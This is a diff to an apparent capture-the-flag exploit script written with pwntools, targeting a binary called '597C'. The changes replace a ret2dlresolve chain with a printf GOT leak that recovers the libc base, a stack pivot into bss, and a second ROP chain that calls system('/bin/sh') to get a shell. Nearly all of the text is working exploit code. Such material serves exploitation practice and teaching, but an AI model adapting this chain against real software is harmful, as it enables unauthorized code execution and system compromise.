@@ -4,6 +4,7 @@ import time
 #init
 
 e = ELF('./597C')
+libc = ELF('./libc-2.31.so')
 
 context.binary = e
 
@@ -37,9 +38,13 @@ off3 = 0x3000
 
 arr = e.sym['a']
 scanf_plt = e.plt['__isoc99_scanf']
+printf_got = e.got['printf']
+printf_off = libc.sym['printf']
 
 log.info('Arr adr: ' + hex(arr))
 log.info('Scanf plt adr: ' + hex(scanf_plt))
+log.info('Printf got adr: ' + hex(printf_got))
+log.info('Printf libc off: ' + hex(printf_off))
 
 #exploit
 
@@ -54,13 +59,12 @@ w = n
 num(off3, (1 << 64) + 0x8 * (off2 - n - 8))
 pr(n)
 
-#use pwntools to make ret2dlresolve rop chain with scanf to write to bss
-
-dlr = Ret2dlresolvePayload(e, symbol="system", args=["/bin/sh"])
+#rop leak libc and input and pivot to second rop chain
 
 rop = ROP(e)
-rop.call(scanf_plt, [arr + 0x4 * (n - 1), dlr.data_addr])
-rop.ret2dlresolve(dlr)
+rop.printf(arr + 0x4 * (n - 1), printf_got)
+rop.call(scanf_plt, [arr + 0x4 * (n - 1), arr + 0x800])
+rop.migrate(arr + 0x800)
 
 log.info('ROP chain:\n' + rop.dump())
 
@@ -103,16 +107,20 @@ while w > 1:
 
 pr(u64(b'%s'.ljust(8, b'\x00')))
 
-#send dlresolve payload to call system('/bin/sh')
+#get libc leak
 
-log.info('Dlresolve payload:\n' + hexdump(dlr.payload))
+p.recvline()
+libc_off = u64(p.recv(6).ljust(8, b'\x00')) - printf_off
 
-p.sendline(dlr.payload)
+log.info('Libc off adr: ' + hex(libc_off))
 
-#reopen stdout
+#send 2nd rop to call system('/bin/sh')
 
-time.sleep(1)
-p.sendline('exec 1>/dev/tty')
+libc.address = libc_off
+rop = ROP(libc, arr + 0x800)
+rop.system('/bin/sh')
+
+p.sendline(rop.chain())
 
 #pray for flag
 
